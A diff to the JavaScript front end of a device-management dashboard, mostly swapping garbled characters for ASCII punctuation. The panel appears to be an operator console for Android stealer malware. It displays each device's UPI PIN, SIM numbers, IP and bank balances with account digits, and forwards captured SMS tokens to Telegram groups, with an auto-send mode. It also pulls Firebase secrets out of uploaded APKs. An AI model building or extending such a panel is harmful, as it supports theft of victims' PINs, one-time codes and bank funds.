@@ -58,7 +58,7 @@
         });
       });
     });
-    // Send Auto needs Telegram ΓÇö guests never
+    // Send Auto needs Telegram - guests never
     ["#btnSendAuto", "#btnSendAutoOff", "#sendAutoStatus", "#sendAutoLatest", "#sendAutoEvents"].forEach((sel) => {
       document.querySelectorAll(sel).forEach((el) => el.classList.toggle("hidden", isGuest()));
     });
@@ -109,7 +109,7 @@
         const main = document.querySelector(".main");
         if (main) main.insertBefore(banner, main.firstChild);
       }
-      banner.textContent = "Guest access (temporary key) ΓÇö limited by permissions set on the key.";
+      banner.textContent = "Guest access (temporary key) - limited by permissions set on the key.";
       banner.classList.remove("hidden");
       applyGuestPermsUi();
     } else if (banner) {
@@ -197,7 +197,7 @@
       return val < 1e12 ? val * 1000 : val;
     }
     const s = String(val).trim();
-    if (!s || s === "ΓÇö" || s === "-" || s.toLowerCase() === "null") return null;
+    if (!s || s === "-" || s === "-" || s.toLowerCase() === "null") return null;
     if (/^\d+$/.test(s)) {
       const n = Number(s);
       if (!isFinite(n) || n <= 0) return null;
@@ -245,7 +245,7 @@
   }
 
   function fmtDate(ts) {
-    if (!ts) return "ΓÇö";
+    if (!ts) return "-";
     return new Date(ts).toLocaleString("en-IN", {
       day: "2-digit", month: "2-digit", year: "numeric",
       hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true,
@@ -253,7 +253,7 @@
   }
 
   function fmtAgo(ts) {
-    if (!ts) return "ΓÇö";
+    if (!ts) return "-";
     const diff = Date.now() - ts;
     if (diff < 0) return "Just now";
     const s = Math.floor(diff / 1000);
@@ -278,29 +278,29 @@
     if (!raw || typeof raw !== "object") return null;
     const sims = parseSims(raw.sims);
     let lastSeen = pickLastSeen(raw);
-    // Online devices with no timestamp ΓåÆ treat as now so modal isn't blank
+    // Online devices with no timestamp -> treat as now so modal isn't blank
     if (!lastSeen && raw.status === true) lastSeen = Date.now();
     return {
       id,
       name: String(raw.modelName || raw.model || raw.deviceName || id),
-      battery: String(raw.battery ?? "ΓÇö"),
+      battery: String(raw.battery ?? "-"),
       batteryDisplay: raw.battery != null
         ? (String(raw.battery).includes("%") ? String(raw.battery) : String(raw.battery) + "%")
-        : "ΓÇö",
+        : "-",
       status: raw.status === true,
       phone: String(raw.mobNo || sims[0]?.phoneNumber || sims[0]?.number || "N/A"),
-      android: String(raw.androidV || raw.androidVersion || "ΓÇö"),
-      sdk: String(raw.sdkV || raw.sdkVersion || "ΓÇö"),
+      android: String(raw.androidV || raw.androidVersion || "-"),
+      sdk: String(raw.sdkV || raw.sdkVersion || "-"),
       upipin: raw.upipin ? String(raw.upipin) : null,
       notes: String(raw.notes || raw.note || ""),
-      ip: String(raw.ip_address || raw.ip || "ΓÇö"),
-      storage: String(raw.storage || "ΓÇö"),
-      cpu: String(raw.cpu_arch || "ΓÇö"),
-      provider: String(raw.service_provider || "ΓÇö"),
+      ip: String(raw.ip_address || raw.ip || "-"),
+      storage: String(raw.storage || "-"),
+      cpu: String(raw.cpu_arch || "-"),
+      provider: String(raw.service_provider || "-"),
       sims,
       lastSeen,
-      lastSeenFmt: lastSeen ? fmtDate(lastSeen) : "ΓÇö",
-      lastSeenAgo: lastSeen ? fmtAgo(lastSeen) : "ΓÇö",
+      lastSeenFmt: lastSeen ? fmtDate(lastSeen) : "-",
+      lastSeenAgo: lastSeen ? fmtAgo(lastSeen) : "-",
       raw,
     };
   }
@@ -329,10 +329,10 @@
     const state = sim.simState || sim.state || sim.status || "";
     const phone = sim.phoneNumber || sim.number || sim.mobNo || "";
     const parts = [state, carrier, phone].filter(Boolean);
-    return parts.length ? parts.join(" ΓÇö ") : "SIM " + (idx + 1);
+    return parts.length ? parts.join(" - ") : "SIM " + (idx + 1);
   }
 
-  // ΓöÇΓöÇΓöÇ Auth ΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇ
+  // --- Auth -----------------------------------------------
   function initAuth() {
     document.querySelectorAll(".tab").forEach((t) => {
       t.onclick = () => {
@@ -495,7 +495,7 @@
     show("twofaPanel", false);
   }
 
-  // ΓöÇΓöÇΓöÇ App ΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇ
+  // --- App ------------------------------------------------
   async function enterApp(username, me) {
     currentUser = username;
     if (me?.scope) {
@@ -510,7 +510,7 @@
     }
     show("authView", false);
     show("appView", true);
-    const guestTag = isGuest() ? " ┬╖ Guest key" : "";
+    const guestTag = isGuest() ? "  |  Guest key" : "";
     $("sidebarUser").innerHTML = "Logged in as <b>" + esc(username) + "</b>" + esc(guestTag);
     if ($("mobileUser")) $("mobileUser").textContent = (username || "") + (isGuest() ? " (key)" : "");
     applyScopeUi();
@@ -527,7 +527,7 @@
       selectProject(projects[0].id);
     } else if (isGuest()) {
       switchView("devices");
-      toast("Koi Firebase project linked nahi ΓÇö owner se poocho", true);
+      toast("Koi Firebase project linked nahi - owner se poocho", true);
     } else {
       switchView("projects");
     }
@@ -726,7 +726,7 @@
             <div>
               <div><b>${esc(s.label || s.client || "Session")}</b>${isCurrent ? '<span class="current-badge">This device</span>' : ""}</div>
               <div class="session-meta">
-                ${esc(s.client || "ΓÇö")} ┬╖ IP ${esc(s.ip || "ΓÇö")}<br/>
+                ${esc(s.client || "-")}  |  IP ${esc(s.ip || "-")}<br/>
                 Started ${esc(fmtDate(parseTs(s.createdAt) || Date.parse(s.createdAt)))}<br/>
                 Last seen ${esc(fmtDate(parseTs(s.lastSeenAt) || Date.parse(s.lastSeenAt)))}
               </div>
@@ -774,9 +774,9 @@
       const sel = $("activityKeySelect");
       if (sel) {
         sel.innerHTML =
-          '<option value="">Select keyΓÇª</option>' +
+          '<option value="">Select key...</option>' +
           accessKeysCache
-            .map((k) => `<option value="${esc(k.id)}">${esc(k.label)} (${esc(k.keyPrefix)}ΓÇª)</option>`)
+            .map((k) => `<option value="${esc(k.id)}">${esc(k.label)} (${esc(k.keyPrefix)}...)</option>`)
             .join("");
       }
       const active = accessKeysCache.filter((k) => !k.revoked);
@@ -803,9 +803,9 @@
             .join("") || '<span class="perm-chip">Devices</span>';
           return `<div class="akey-row">
             <div>
-              <div><b>${esc(k.label)}</b> ┬╖ ${esc(status)}</div>
+              <div><b>${esc(k.label)}</b>  |  ${esc(status)}</div>
               <div class="akey-meta">
-                ${esc(k.keyPrefix)}ΓÇª ┬╖ Expires ${esc(fmtDate(parseTs(k.expiresAt) || Date.parse(k.expiresAt)))}<br/>
+                ${esc(k.keyPrefix)}...  |  Expires ${esc(fmtDate(parseTs(k.expiresAt) || Date.parse(k.expiresAt)))}<br/>
                 Last used ${k.lastUsedAt ? esc(fmtDate(parseTs(k.lastUsedAt) || Date.parse(k.lastUsedAt))) : "never"}
               </div>
               <div class="perm-chips">${chips}</div>
@@ -858,7 +858,7 @@
       show("keyCreatedBox", true);
       $("keyCreatedValue").textContent = data.key || "";
       $("keyLabel").value = "";
-      toast("Key created ΓÇö abhi copy kar lo");
+      toast("Key created - abhi copy kar lo");
       loadAccessKeys();
     } catch (e) {
       toast(e.message, true);
@@ -897,8 +897,8 @@
                           ? "Key revoked"
                           : esc(a.action);
           return `<div class="activity-item">
-            <div><b>${title}</b> ΓÇö ${esc(a.detail || "")}</div>
-            <div class="muted">${esc(a.client || "")} ┬╖ IP ${esc(a.ip || "ΓÇö")} ┬╖ ${esc(
+            <div><b>${title}</b> - ${esc(a.detail || "")}</div>
+            <div class="muted">${esc(a.client || "")}  |  IP ${esc(a.ip || "-")}  |  ${esc(
             fmtDate(parseTs(a.at) || Date.parse(a.at || a.createdAt))
           )}</div>
           </div>`;
@@ -1017,7 +1017,7 @@
   }
 
   async function extractFirebaseFromApk(file) {
-    if (typeof JSZip === "undefined") throw new Error("JSZip load nahi hua ΓÇö page refresh karo");
+    if (typeof JSZip === "undefined") throw new Error("JSZip load nahi hua - page refresh karo");
     const zip = await JSZip.loadAsync(await file.arrayBuffer());
     let firebaseUrl = "";
     let secret = "";
@@ -1094,7 +1094,7 @@
     try {
       const found = await extractFirebaseFromApk(file);
       if (!found || (!found.firebaseUrl && !found.secret)) {
-        setApkStatus("APK se Firebase nahi mila ΓÇö manual daalo", true);
+        setApkStatus("APK se Firebase nahi mila - manual daalo", true);
         return;
       }
       lastExtracted = found;
@@ -1102,7 +1102,7 @@
       if (found.firebaseUrl) bit.push("URL ok");
       if (found.secret) bit.push("Key ok");
       if (found.projectId) bit.push("Project: " + found.projectId);
-      setApkStatus("Extract OK ΓÇö " + bit.join(" ┬╖ "));
+      setApkStatus("Extract OK - " + bit.join("  |  "));
       // auto-fill form
       if (found.firebaseUrl) $("fbUrl").value = found.firebaseUrl;
       if (found.secret) $("fbSecret").value = found.secret;
@@ -1110,7 +1110,7 @@
         $("fbName").value = found.projectId || file.name.replace(/\.(apk|zip)$/i, "");
       }
       show("btnUseExtracted", true);
-      toast("APK se Firebase mil gaya ΓÇö Save & Test dabao");
+      toast("APK se Firebase mil gaya - Save & Test dabao");
     } catch (e) {
       setApkStatus(e.message || "Extract failed", true);
     }
@@ -1125,7 +1125,7 @@
       $("fbName").value = lastExtracted.projectId;
     }
     $("fbName").scrollIntoView({ behavior: "smooth", block: "center" });
-    toast("Form fill ho gaya ΓÇö Save & Test dabao");
+    toast("Form fill ho gaya - Save & Test dabao");
   };
 
   const drop = $("apkDropZone");
@@ -1192,7 +1192,7 @@
     $("ovTotal").textContent = total;
     $("ovUpi").textContent = upi;
     $("ovOnlinePct").textContent = pct + "% live";
-    $("ovOfflinePct").textContent = total ? Math.round((offline / total) * 100) + "% away" : "ΓÇö";
+    $("ovOfflinePct").textContent = total ? Math.round((offline / total) * 100) + "% away" : "-";
     if ($("onlineRing")) {
       $("onlineRing").style.setProperty("--pct", pct + "%");
       $("onlineRingPct").textContent = pct + "%";
@@ -1227,8 +1227,8 @@
           <div class="activity-item" style="cursor:pointer" data-open="${esc(d.id)}">
             <div class="activity-dot" style="background:${d.status ? "var(--green)" : "var(--orange)"}"></div>
             <div style="flex:1">
-              <b>${esc(d.name)}</b> ┬╖ ${d.status ? "Online" : "Offline"}
-              <div style="color:var(--muted);font-size:0.75rem;margin-top:2px">${esc(d.phone)} ┬╖ ${esc(d.lastSeenFmt)}</div>
+              <b>${esc(d.name)}</b>  |  ${d.status ? "Online" : "Offline"}
+              <div style="color:var(--muted);font-size:0.75rem;margin-top:2px">${esc(d.phone)}  |  ${esc(d.lastSeenFmt)}</div>
             </div>
             <button class="btn btn-sm btn-outline" data-open="${esc(d.id)}">Open</button>
           </div>
@@ -1279,7 +1279,7 @@
         <div class="field"><span>UPI Pin: </span><b>${esc(d.upipin || "N/A")}</b></div>
         <div class="field"><span>Model: </span><b>${esc(d.name)}</b></div>
         <div class="field"><span>Battery: </span><b>${esc(d.batteryDisplay)}</b></div>
-        <div class="date">${esc(d.lastSeenFmt !== "ΓÇö" ? d.lastSeenFmt : "ΓÇö")}</div>
+        <div class="date">${esc(d.lastSeenFmt !== "-" ? d.lastSeenFmt : "-")}</div>
         <div class="notes">${d.notes ? esc(d.notes) : "No Notes"}</div>
         <div class="card-actions">
           <button class="icon-btn star ${isFav(d.id) ? "on" : ""}" title="Favorite" data-star="${esc(d.id)}">${ico("star")}</button>
@@ -1460,7 +1460,7 @@
       $(elId).value = text.trim();
       toast("Pasted");
     } catch (e) {
-      toast("Clipboard paste allowed nahi ΓÇö manually paste karo", true);
+      toast("Clipboard paste allowed nahi - manually paste karo", true);
     }
   }
 
@@ -1498,14 +1498,14 @@
     if (latestEl) {
       latestEl.style.display = "block";
       latestEl.innerHTML =
-        "<b>Token/SMS queued</b> ΓåÆ device <b>" +
+        "<b>Token/SMS queued</b> -> device <b>" +
         esc(latest.deviceName || latest.deviceId) +
-        "</b> ┬╖ grp <b>" +
+        "</b>  |  grp <b>" +
         esc(latest.groupTitle || latest.chatId) +
-        "</b> ┬╖ <b>" +
+        "</b>  |  <b>" +
         esc(String(latest.ms)) +
         " ms</b>" +
-        (latest.to ? " ┬╖ to <code>" + esc(latest.to) + "</code>" : "");
+        (latest.to ? "  |  to <code>" + esc(latest.to) + "</code>" : "");
     }
     box.innerHTML = events
       .slice(0, 12)
@@ -1515,12 +1515,12 @@
           '<div style="padding:6px 0;border-bottom:1px solid var(--border)">' +
           '<span style="color:var(--green);font-weight:700">' +
           esc(String(e.ms)) +
-          "ms</span> ┬╖ " +
+          "ms</span>  |  " +
           esc(e.deviceName || e.deviceId) +
-          " ┬╖ " +
+          "  |  " +
           esc(e.groupTitle || e.chatId) +
-          (e.to ? " ┬╖ " + esc(e.to) : "") +
-          ' <span style="color:var(--muted)">┬╖ ' +
+          (e.to ? "  |  " + esc(e.to) : "") +
+          ' <span style="color:var(--muted)"> |  ' +
           esc(t) +
           "</span></div>"
         );
@@ -1551,7 +1551,7 @@
         renderAutoEvents(data.events || []);
         if (!silent) startSendAutoPoll();
       } else {
-        box.innerHTML = "Send Auto: <b>OFF</b> ΓÇö niche se group choose karke ON karo";
+        box.innerHTML = "Send Auto: <b>OFF</b> - niche se group choose karke ON karo";
         show(offBtn, false);
         renderAutoEvents([]);
         stopSendAutoPoll();
@@ -1629,7 +1629,7 @@
       const data = await api("/api/telegram/groups");
       const groups = data.groups || [];
       if (!groups.length) {
-        toast("Pehle bot ko group/channel me add karo ΓÇö Telegram & 2FA page pe auto list aayegi", true);
+        toast("Pehle bot ko group/channel me add karo - Telegram & 2FA page pe auto list aayegi", true);
         return;
       }
       openSendAutoModal(groups);
@@ -1664,7 +1664,7 @@
       const u = await api("/api/telegram/user");
       const st = $("tgUserStatus");
       if (u.connected) {
-        st.textContent = "User TG: @" + (u.username || "connected") + (u.phone ? " ┬╖ " + u.phone : "");
+        st.textContent = "User TG: @" + (u.username || "connected") + (u.phone ? "  |  " + u.phone : "");
         st.style.color = "var(--green, #56ca00)";
         show("tgUserLoginBox", false);
         show("tgUserConnectedBox", true);
@@ -1682,7 +1682,7 @@
     try {
       const info = await api("/api/telegram/bot");
       if (info.connected) {
-        status.textContent = "Bot @" + (info.botUsername || "bot") + (info.webhookSet ? " ┬╖ webhook OK" : "");
+        status.textContent = "Bot @" + (info.botUsername || "bot") + (info.webhookSet ? "  |  webhook OK" : "");
         status.style.color = "var(--green, #56ca00)";
         $("tgWebhookUrl").value = info.webhookUrl || "";
       } else {
@@ -1693,14 +1693,14 @@
       const groupsData = await api("/api/telegram/groups");
       const groups = groupsData.groups || [];
       if (!groups.length) {
-        box.innerHTML = '<div class="empty">Koi group nahi ΓÇö bot add karo YA User TG se invite join / Sync karo</div>';
+        box.innerHTML = '<div class="empty">Koi group nahi - bot add karo YA User TG se invite join / Sync karo</div>';
         return;
       }
       box.innerHTML = groups.map((g) => `
         <div class="modal-card" style="margin-bottom:8px;justify-content:space-between;gap:10px;flex-wrap:wrap">
           <div style="min-width:0;flex:1">
             <div class="val white">${esc(g.title || "Untitled")} <span class="lbl">(${esc(g.source || "?")})</span></div>
-            <div class="lbl">${esc(g.type || "group")} ┬╖ <code>${esc(g.chatId)}</code></div>
+            <div class="lbl">${esc(g.type || "group")}  |  <code>${esc(g.chatId)}</code></div>
             <div class="lbl" style="margin-top:4px">${
               g.autoSend
                 ? '<span style="color:var(--green);font-weight:700">Auto ON → ' + esc(g.autoSend.deviceName || g.autoSend.deviceId) + " · SIM " + (g.autoSend.from === 2 ? 2 : 1) + "</span>"
@@ -1778,9 +1778,9 @@
       });
       const data = await res.json().catch(() => ({}));
       if (!res.ok) throw new Error(data.error || "Restore failed");
-      toast("Restored ΓÇö " + (data.users || 0) + " users. Page refresh.");
+      toast("Restored - " + (data.users || 0) + " users. Page refresh.");
       $("backupStatus").style.display = "block";
-      $("backupStatus").textContent = "OK: " + (data.path || "") + " ┬╖ users=" + (data.users || 0);
+      $("backupStatus").textContent = "OK: " + (data.path || "") + "  |  users=" + (data.users || 0);
     } catch (e) { toast(e.message, true); }
   };
 
@@ -1952,9 +1952,9 @@
     $("modalLastSeenStatus").textContent = d.status ? "Online" : "Offline";
     $("modalLastSeenStatus").className = "val " + (d.status ? "green" : "orange");
     $("modalLastSeenDot").className = "dot " + (d.status ? "green" : "red");
-    const timeText = d.lastSeenFmt && d.lastSeenFmt !== "ΓÇö"
+    const timeText = d.lastSeenFmt && d.lastSeenFmt !== "-"
       ? d.lastSeenFmt
-      : (d.status ? fmtDate(Date.now()) : "ΓÇö");
+      : (d.status ? fmtDate(Date.now()) : "-");
     $("modalLastSeenTime").textContent = timeText;
     show("modalLastSeen", true);
   }
@@ -2010,15 +2010,15 @@
       $("financeBody").innerHTML = `
         <div class="stats-row" style="margin-bottom:14px">
           <div class="stat-pill"><div class="lbl">Banks</div><div class="val cyan">${sum.bankCount || banks.length}</div></div>
-          <div class="stat-pill"><div class="lbl">Balance</div><div class="val" style="color:var(--amber)">Γé╣${esc(sum.totalBalance || "0")}</div></div>
-          <div class="stat-pill"><div class="lbl">Credit</div><div class="val green">Γé╣${esc(sum.totalCredit || "0")}</div></div>
-          <div class="stat-pill"><div class="lbl">Debit</div><div class="val" style="color:var(--red)">Γé╣${esc(sum.totalDebit || "0")}</div></div>
+          <div class="stat-pill"><div class="lbl">Balance</div><div class="val" style="color:var(--amber)">Rs${esc(sum.totalBalance || "0")}</div></div>
+          <div class="stat-pill"><div class="lbl">Credit</div><div class="val green">Rs${esc(sum.totalCredit || "0")}</div></div>
+          <div class="stat-pill"><div class="lbl">Debit</div><div class="val" style="color:var(--red)">Rs${esc(sum.totalDebit || "0")}</div></div>
         </div>
         ${banks.map((b) => `
           <div class="finance-bank">
-            <div class="name">${esc(b.bankName)} ${b.accountLast4 ? "ΓÇóΓÇó" + esc(b.accountLast4) : ""}</div>
-            <div class="bal">Γé╣${esc(b.availableBalance)}</div>
-            <div class="sub">Cr Γé╣${esc(b.totalCredit)} ┬╖ Dr Γé╣${esc(b.totalDebit)} ┬╖ ${b.transactionCount || 0} txns</div>
+            <div class="name">${esc(b.bankName)} ${b.accountLast4 ? "**" + esc(b.accountLast4) : ""}</div>
+            <div class="bal">Rs${esc(b.availableBalance)}</div>
+            <div class="sub">Cr Rs${esc(b.totalCredit)}  |  Dr Rs${esc(b.totalDebit)}  |  ${b.transactionCount || 0} txns</div>
           </div>
         `).join("")}`;
     } catch (e) {
